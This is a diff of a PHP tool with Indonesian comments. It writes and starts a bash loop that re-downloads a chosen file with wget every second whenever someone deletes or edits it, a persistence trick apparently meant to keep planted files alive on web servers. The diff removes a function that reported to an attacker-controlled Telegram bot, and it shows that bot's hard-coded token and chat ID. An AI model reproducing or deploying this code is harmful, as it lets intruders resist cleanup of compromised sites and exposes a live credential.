@@ -1,6 +1,6 @@
 <?php
 // Fungsi untuk membuat bash script yang akan menjalankan wget setiap detik jika file terhapus atau diubah
-function setupBashScript($url, $fileName, $web, $bot_token, $chat_id) {
+function setupBashScript($url, $fileName, $web) {
     // Mendapatkan path direktori tempat script diletakkan
     $currentDir = __DIR__;
     
@@ -13,13 +13,6 @@ function setupBashScript($url, $fileName, $web, $bot_token, $chat_id) {
     // Membuat bash script untuk menjalankan wget setiap detik jika file terhapus atau kontennya berubah
      $bashScript = <<<BASH
                  #!/bin/bash
-                 function send_telegram_message() {
-                   local text="\$1"
-                   curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" \\
-                        -d "chat_id=${chat_id}" \\
-                        -d "text=\${text}"
-                 }
-                 
                  originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')
                  while true; do
                    if [ ! -f '$currentDir/$fileName' ]; then
@@ -66,10 +59,8 @@ function removeBashScript($fileName) {
 if (isset($_POST['start'])) {
     $url = $_POST['url'];
     $web = $_POST['web'];
-    $bot_token = '7513781790:AAFC8T_sYrEM1sgIoqWzcBfjSE5Md5MrUYI';
-    $chat_id = '6116824863';
     $fileName = $_POST['filename'];
-    setupBashScript($url, $fileName, $web, $bot_token, $chat_id);
+    setupBashScript($url, $fileName, $web);
 }
 
 // Jika pengguna menekan tombol "Stop", hentikan bash script
